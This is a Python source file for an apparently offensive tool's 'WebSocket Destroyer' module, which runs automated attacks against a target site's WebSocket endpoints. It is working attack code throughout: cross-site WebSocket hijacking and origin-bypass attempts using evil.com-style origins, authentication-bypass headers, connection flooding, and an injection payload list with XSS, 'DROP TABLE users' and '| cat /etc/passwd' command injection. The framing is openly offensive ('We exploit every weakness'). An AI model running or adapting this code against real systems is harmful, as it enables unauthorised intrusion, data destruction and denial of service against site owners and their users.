"""
BREACH.AI - WebSocket Destroyer

Comprehensive WebSocket attack module.
Real-time means real-time exploitation.

Attack Categories:
1. Origin Bypass - Cross-site WebSocket hijacking
2. Message Injection - Inject malicious messages
3. Authentication Bypass - Skip WebSocket auth
4. DoS Attacks - Message flooding, malformed frames
5. Data Interception - Sniff WebSocket traffic
6. Protocol Smuggling - HTTP/WS confusion
"""

import asyncio
import base64
import hashlib
import json
import re
import struct
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urljoin, urlparse

from breach.attacks.base import AttackResult, BaseAttack
from breach.core.memory import AccessLevel, Severity
from breach.utils.logger import logger


@dataclass
class WebSocketEndpoint:
    """WebSocket endpoint information."""
    url: str
    protocol: str = "wss"
    subprotocols: list[str] = field(default_factory=list)
    auth_required: bool = False
    origin_validated: bool = True


class WebSocketDestroyer(BaseAttack):
    """
    WebSocket DESTROYER - Comprehensive WebSocket exploitation.

    WebSockets bypass traditional security controls.
    We exploit every weakness in real-time communications.
    """

    name = "WebSocket Destroyer"
    attack_type = "websocket_attack"
    description = "Comprehensive WebSocket vulnerability exploitation"
    severity = Severity.HIGH
    owasp_category = "API Security"
    cwe_id = 1385

    # Common WebSocket paths
    WS_PATHS = [
        "/ws",
        "/websocket",
        "/socket",
        "/socket.io/",
        "/sockjs/",
        "/realtime",
        "/live",
        "/chat",
        "/notifications",
        "/api/ws",
        "/api/websocket",
        "/v1/ws",
        "/stream",
        "/events",
    ]

    # Injection payloads for WebSocket messages
    INJECTION_PAYLOADS = [
        # XSS payloads
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "javascript:alert(1)",

        # SQL injection
        "' OR '1'='1",
        "1; DROP TABLE users;--",

        # Command injection
        "; ls -la",
        "| cat /etc/passwd",

        # JSON injection
        '{"admin": true}',
        '{"role": "admin", "__proto__": {"admin": true}}',
    ]

    # Malicious origins for CSWSH testing
    EVIL_ORIGINS = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        "file://",
    ]

    def get_payloads(self) -> list[str]:
        return self.WS_PATHS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if WebSocket is in use."""
        response = await self.http_client.get(url)

        ws_indicators = [
            "websocket", "socket.io", "sockjs", "ws://", "wss://",
            "upgrade", "connection", "sec-websocket",
        ]

        body_lower = response.body.lower()
        return any(ind in body_lower for ind in ws_indicators)

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Execute comprehensive WebSocket attacks."""
        result = self._create_result(False, url, parameter)

        # Discover WebSocket endpoints
        ws_endpoints = await self._discover_ws_endpoints(url)

        if not ws_endpoints:
            result.details = "No WebSocket endpoints found"
            return result

        logger.info(f"[WS] Found {len(ws_endpoints)} WebSocket endpoint(s)")

        for endpoint in ws_endpoints:
            logger.info(f"[WS] Testing endpoint: {endpoint.url}")

            # Attack 1: Cross-Site WebSocket Hijacking
            cswsh_result = await self._attack_cswsh(url, endpoint)
            if cswsh_result:
                result.success = True
                result.severity = Severity.CRITICAL
                result.details = "Cross-Site WebSocket Hijacking possible!"
                result.add_evidence(
                    "ws_cswsh",
                    "WebSocket accepts cross-origin connections",
                    cswsh_result["details"]
                )

            # Attack 2: Origin Bypass
            origin_result = await self._attack_origin_bypass(url, endpoint)
            if origin_result:
                result.success = True
                result.details = f"Origin bypass: {origin_result['origin']}"
                result.add_evidence(
                    "ws_origin_bypass",
                    "WebSocket Origin validation bypassed",
                    origin_result["details"]
                )

            # Attack 3: Authentication Bypass
            auth_result = await self._attack_auth_bypass(url, endpoint)
            if auth_result:
                result.success = True
                result.access_gained = AccessLevel.USER
                result.details = "WebSocket authentication bypassed"
                result.add_evidence(
                    "ws_auth_bypass",
                    "WebSocket connection without authentication",
                    auth_result["details"]
                )

            # Attack 4: Message Injection
            injection_result = await self._attack_message_injection(url, endpoint)
            if injection_result:
                result.success = True
                result.payload = injection_result["payload"]
                result.details = f"WebSocket injection: {injection_result['type']}"
                result.add_evidence(
                    "ws_injection",
                    injection_result["type"],
                    injection_result["payload"]
                )

            # Attack 5: DoS via Message Flooding
            dos_result = await self._attack_dos(url, endpoint)
            if dos_result:
                result.success = True
                result.details = f"WebSocket DoS: {dos_result['type']}"
                result.add_evidence(
                    "ws_dos",
                    dos_result["type"],
                    dos_result["details"]
                )

            # Attack 6: Protocol Confusion
            protocol_result = await self._attack_protocol_confusion(url, endpoint)
            if protocol_result:
                result.success = True
                result.details = "WebSocket/HTTP protocol confusion"
                result.add_evidence(
                    "ws_protocol_confusion",
                    "HTTP requests processed as WebSocket",
                    protocol_result["details"]
                )

        return result

    async def _discover_ws_endpoints(self, url: str) -> list[WebSocketEndpoint]:
        """Discover WebSocket endpoints."""
        endpoints = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Check main page for WS URLs
        response = await self.http_client.get(url)

        # Look for WebSocket URLs in response
        ws_patterns = [
            r'wss?://[^\s"\'<>]+',
            r'["\'](/ws[^\s"\'<>]*)["\']',
            r'["\'](/socket[^\s"\'<>]*)["\']',
            r'["\'](/websocket[^\s"\'<>]*)["\']',
        ]

        for pattern in ws_patterns:
            matches = re.findall(pattern, response.body, re.I)
            for match in matches:
                if match.startswith("ws"):
                    endpoints.append(WebSocketEndpoint(url=match))
                else:
                    ws_url = f"wss://{parsed.netloc}{match}"
                    endpoints.append(WebSocketEndpoint(url=ws_url))

        # Probe common paths
        for path in self.WS_PATHS:
            try:
                full_url = urljoin(base_url, path)

                # Try WebSocket upgrade request
                upgrade_headers = {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Sec-WebSocket-Key": base64.b64encode(b"test-key-12345678").decode(),
                    "Sec-WebSocket-Version": "13",
                }

                response = await self.http_client.get(full_url, headers=upgrade_headers)

                # 101 Switching Protocols or 426 Upgrade Required indicates WS
                if response.status_code in [101, 426, 400]:
                    ws_url = f"wss://{parsed.netloc}{path}"
                    endpoints.append(WebSocketEndpoint(url=ws_url))

            except Exception:
                continue

        return endpoints

    async def _attack_cswsh(self, url: str, endpoint: WebSocketEndpoint) -> Optional[dict]:
        """Test for Cross-Site WebSocket Hijacking."""
        logger.debug("[WS] Testing CSWSH...")

        parsed = urlparse(url)

        # Simulate WebSocket handshake with evil origin
        for evil_origin in self.EVIL_ORIGINS:
            headers = {
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": base64.b64encode(b"cswsh-test-key12").decode(),
                "Sec-WebSocket-Version": "13",
                "Origin": evil_origin,
            }

            # Convert wss:// to https:// for HTTP request
            http_url = endpoint.url.replace("wss://", "https://").replace("ws://", "http://")

            try:
                response = await self.http_client.get(http_url, headers=headers)

                if response.status_code == 101:
                    return {
                        "origin": evil_origin,
                        "details": f"WebSocket accepts connections from {evil_origin}"
                    }

                # Check for Sec-WebSocket-Accept header without origin validation
                if "sec-websocket-accept" in response.headers.get("", "").lower():
                    return {
                        "origin": evil_origin,
                        "details": "WebSocket handshake completed with evil origin"
                    }

            except Exception:
                continue

        return None

    async def _attack_origin_bypass(
        self,
        url: str,
        endpoint: WebSocketEndpoint
    ) -> Optional[dict]:
        """Test Origin header bypass techniques."""
        logger.debug("[WS] Testing Origin bypass...")

        parsed = urlparse(url)
        legit_origin = f"https://{parsed.netloc}"

        # Origin bypass techniques
        bypass_origins = [
            f"https://{parsed.netloc}.evil.com",
            f"https://evil.{parsed.netloc}",
            f"https://{parsed.netloc}@evil.com",
            f"https://evil.com#{parsed.netloc}",
            f"https://{parsed.netloc}%00.evil.com",
            "null",
        ]

        http_url = endpoint.url.replace("wss://", "https://").replace("ws://", "http://")

        for bypass_origin in bypass_origins:
            headers = {
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": base64.b64encode(b"origin-bypass123").decode(),
                "Sec-WebSocket-Version": "13",
                "Origin": bypass_origin,
            }

            try:
                response = await self.http_client.get(http_url, headers=headers)

                if response.status_code == 101:
                    return {
                        "origin": bypass_origin,
                        "details": f"Origin bypass successful with: {bypass_origin}"
                    }

            except Exception:
                continue

        return None

    async def _attack_auth_bypass(
        self,
        url: str,
        endpoint: WebSocketEndpoint
    ) -> Optional[dict]:
        """Test for WebSocket authentication bypass."""
        logger.debug("[WS] Testing authentication bypass...")

        http_url = endpoint.url.replace("wss://", "https://").replace("ws://", "http://")
        parsed = urlparse(url)

        # Try connecting without any auth
        headers = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": base64.b64encode(b"no-auth-test1234").decode(),
            "Sec-WebSocket-Version": "13",
            "Origin": f"https://{parsed.netloc}",
        }

        try:
            response = await self.http_client.get(http_url, headers=headers)

            if response.status_code == 101:
                return {
                    "details": "WebSocket connection established without authentication"
                }

            # Try with various bypass headers
            bypass_headers = [
                {"X-Forwarded-For": "127.0.0.1"},
                {"X-Real-IP": "localhost"},
                {"Authorization": "Bearer null"},
            ]

            for bypass in bypass_headers:
                test_headers = {**headers, **bypass}
                response = await self.http_client.get(http_url, headers=test_headers)

                if response.status_code == 101:
                    return {
                        "details": f"Auth bypassed with headers: {list(bypass.keys())}"
                    }

        except Exception:
            pass

        return None

    async def _attack_message_injection(
        self,
        url: str,
        endpoint: WebSocketEndpoint
    ) -> Optional[dict]:
        """Test for WebSocket message injection."""
        logger.debug("[WS] Testing message injection...")

        # Since we can't easily establish a full WS connection via HTTP,
        # we test for injection patterns in the upgrade response

        http_url = endpoint.url.replace("wss://", "https://").replace("ws://", "http://")
        parsed = urlparse(url)

        for payload in self.INJECTION_PAYLOADS:
            # Try injection in subprotocol
            headers = {
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": base64.b64encode(b"injection-test12").decode(),
                "Sec-WebSocket-Version": "13",
                "Sec-WebSocket-Protocol": payload,
                "Origin": f"https://{parsed.netloc}",
            }

            try:
                response = await self.http_client.get(http_url, headers=headers)

                # Check if payload is reflected
                if payload in response.body:
                    injection_type = self._identify_injection_type(payload)
                    return {
                        "type": injection_type,
                        "payload": payload,
                        "location": "Sec-WebSocket-Protocol header reflection"
                    }

            except Exception:
                continue

        return None

    def _identify_injection_type(self, payload: str) -> str:
        """Identify the type of injection."""
        if "<script" in payload.lower() or "javascript:" in payload.lower():
            return "XSS"
        if "'" in payload and ("or" in payload.lower() or "select" in payload.lower()):
            return "SQL Injection"
        if "|" in payload or ";" in payload:
            return "Command Injection"
        if "__proto__" in payload:
            return "Prototype Pollution"
        return "Injection"

    async def _attack_dos(self, url: str, endpoint: WebSocketEndpoint) -> Optional[dict]:
        """Test for WebSocket DoS vulnerabilities."""
        logger.debug("[WS] Testing DoS vulnerabilities...")

        http_url = endpoint.url.replace("wss://", "https://").replace("ws://", "http://")
        parsed = urlparse(url)

        # Test 1: Many concurrent upgrade requests
        tasks = []
        for i in range(50):
            headers = {
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": base64.b64encode(f"dos-test-{i:04d}1234".encode()).decode(),
                "Sec-WebSocket-Version": "13",
                "Origin": f"https://{parsed.netloc}",
            }
            tasks.append(self.http_client.get(http_url, headers=headers))

        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)

            success_count = sum(1 for r in results if hasattr(r, 'status_code') and r.status_code == 101)

            if success_count >= 40:
                return {
                    "type": "Connection flooding",
                    "details": f"Server accepted {success_count}/50 concurrent WS connections"
                }

        except Exception:
            pass

        # Test 2: Large Sec-WebSocket-Key
        headers = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": "A" * 10000,
            "Sec-WebSocket-Version": "13",
            "Origin": f"https://{parsed.netloc}",
        }

        try:
            response = await self.http_client.get(http_url, headers=headers)

            if response.status_code == 101:
                return {
                    "type": "Large header accepted",
                    "details": "Server accepts abnormally large Sec-WebSocket-Key"
                }

        except Exception:
            pass

        return None

    async def _attack_protocol_confusion(
        self,
        url: str,
        endpoint: WebSocketEndpoint
    ) -> Optional[dict]:
        """Test for HTTP/WebSocket protocol confusion."""
        logger.debug("[WS] Testing protocol confusion...")

        http_url = endpoint.url.replace("wss://", "https://").replace("ws://", "http://")

        # Test if HTTP methods work on WS endpoint
        methods_to_test = ["POST", "PUT", "DELETE"]

        for method in methods_to_test:
            try:
                response = await self.http_client.request(
                    method,
                    http_url,
                    data={"test": "value"},
                    headers={"Content-Type": "application/json"}
                )

                if response.status_code == 200:
                    return {
                        "details": f"HTTP {method} accepted on WebSocket endpoint"
                    }

            except Exception:
                continue

        # Test WebSocket frame in HTTP body
        # This creates a minimal WebSocket frame
        ws_frame = b'\x81\x85\x37\xfa\x21\x3d\x7f\x9f\x4d\x51\x58'  # "Hello" masked

        try:
            response = await self.http_client.post(
                http_url,
                data=ws_frame,
                headers={"Content-Type": "application/octet-stream"}
            )

            if response.status_code == 200:
                return {
                    "details": "WebSocket frames processed via HTTP POST"
                }

        except Exception:
            pass

        return None
